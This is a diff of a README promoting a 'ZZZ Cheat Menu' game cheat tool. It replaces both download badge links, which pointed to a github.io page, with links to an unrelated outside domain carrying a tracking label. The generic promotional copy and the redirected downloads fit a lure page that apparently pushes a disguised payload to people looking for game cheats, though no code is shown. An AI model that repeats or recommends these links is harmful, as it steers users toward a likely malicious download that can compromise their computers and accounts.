@@ -2,7 +2,7 @@
 
 The **ZZZ Cheat Menu** is a powerful tool designed to provide gamers with a comprehensive set of features to modify and enhance their gaming experience. Whether you're looking to unlock special in-game content, change gameplay mechanics, or simply have more fun, the ZZZ Cheat Menu offers everything you need to take control of your game. With its user-friendly interface and wide range of customizations, this cheat menu is perfect for those looking to explore new gameplay possibilities.
 
-[![Download ZZZ CheatMenu](https://img.shields.io/badge/Download-ZZZ%20CheatMenu-blueviolet)](https://zzz-cheat-menu.github.io/.github/)
+[![Download ZZZ CheatMenu](https://img.shields.io/badge/Download-ZZZ%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## ⚡ Key Features
 
@@ -43,4 +43,4 @@ The **ZZZ Cheat Menu** is a powerful tool designed to provide gamers with a comp
 4. **Activate Desired Features**: Choose from a variety of cheats like infinite resources, speed boosts, vehicle mods, and more.
 5. **Enjoy the Enhanced Experience**: Modify your gameplay and explore the full potential of the game with all the unlocked features.
 
-[![Download ZZZ CheatMenu](https://img.shields.io/badge/Download-ZZZ%20CheatMenu-blueviolet)](https://zzz-cheat-menu.github.io/.github/)
+[![Download ZZZ CheatMenu](https://img.shields.io/badge/Download-ZZZ%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
